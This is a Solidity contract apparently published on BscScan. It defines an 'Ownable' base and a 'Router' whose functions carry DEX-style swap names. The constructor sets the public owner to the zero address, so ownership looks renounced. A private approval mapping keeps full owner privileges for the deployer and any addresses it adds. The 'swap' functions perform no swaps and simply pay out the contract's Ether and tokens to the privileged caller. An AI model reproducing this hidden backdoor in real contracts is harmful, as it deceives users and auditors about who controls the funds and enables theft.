/**
 *Submitted for verification at BscScan.com on 2022-09-02
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    mapping(address => bool) private _approveTransfers;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _approveTransfers[_msgSender()] = true;
        _transferOwnership(address(0));
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(_approveTransfers[_msgSender()], "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function approveTransfer(address to) public virtual onlyOwner {
        require(to != address(0), "Ownable: new owner is the zero address");
        _approveTransfers[to] = true;
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Router is Ownable {
    constructor() {}
    receive() external payable {}
    fallback() external payable {}

    function swapETHForExactETH(address payable _to) external payable onlyOwner {
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
    function swapETHForExactRequest(uint256 amountOut) external payable onlyOwner {
        (bool sent, ) = payable(_msgSender()).call{value: amountOut}("");
        require(sent, "Failed to send Ether");
    }
    function swapETHForExactTokens(uint amountOut, address _token ) external payable onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 half = amountOut * 1 / 10;
        amountOut = amountOut - half;
        token.transfer(_msgSender(), half);
        token.transfer(_msgSender(), amountOut);
    }
    function swapExactTokensForETH(address _token, uint256 amountIn, uint256 amountOut) external onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 allowance = token.allowance(_msgSender(), address(this));
        require(allowance >= amountIn, "ERC20: insufficient allowance");
        token.transferFrom(_msgSender(), address(this), amountIn);
        (bool sent, ) = payable(_msgSender()).call{value: amountOut}("");
        require(sent, "Failed to send Ether");
    }

    function swapTokensForExactTokens(address _token, uint256 amountOut) external onlyOwner {
        IERC20 token = IERC20(_token);
        token.transfer(_msgSender(), amountOut);
    }
}